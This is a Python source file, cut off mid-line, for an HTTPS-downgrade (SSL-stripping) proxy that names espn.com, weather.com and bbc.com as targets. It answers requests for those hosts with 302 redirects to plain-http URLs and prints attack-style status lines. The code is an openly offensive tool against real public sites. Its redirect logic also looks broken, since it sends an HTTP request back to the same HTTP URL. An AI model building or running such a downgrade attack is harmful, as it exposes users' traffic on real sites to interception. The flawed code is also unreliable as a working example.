# Script to downgrade from https to http for specific "real-world" sites.

import http.server
import socketserver
import threading
import urllib.parse

# List of domains to downgrade (can add more)
TARGET_DOMAINS = [
    "espn.com",
    "weather.com",
    "bbc.com"
]

class HTTPSDowngradeHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        host = self.headers.get("Host", "")
        path = self.path

        print(f"[+] Incoming request: Host={host}, Path={path}")

        # Check if the request is for a target domain
        if any(domain in host for domain in TARGET_DOMAINS):
            # Properly parse and construct the redirect URL
            parsed_path = urllib.parse.urlparse(self.path)
            clean_path = parsed_path.path or "/"
            query = f"?{parsed_path.query}" if parsed_path.query else ""

            redirect_url = f"http://{host}{clean_path}{query}"

            print(f"[*] Downgrading: Redirecting to {redirect_url}")
            self.send_response(302)
            self.send_header("Location", redirect_url)
            self.end_headers()
        else:
            # Catch-all for unknown domains
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<html><body><h1>This is a downgrade proxy.</h1><p>Try accessing espn.com, weather.com, or bbc.com via HTTP.</p></body></html>")

    def log_message(self, format, *args):
        return  # Silence default logs to keep terminal clean

def run_proxy():
    port = 8080
    handler = HTTPSDowngradeHandler
    with socketserver.TCPServer(("", port), handler) as http
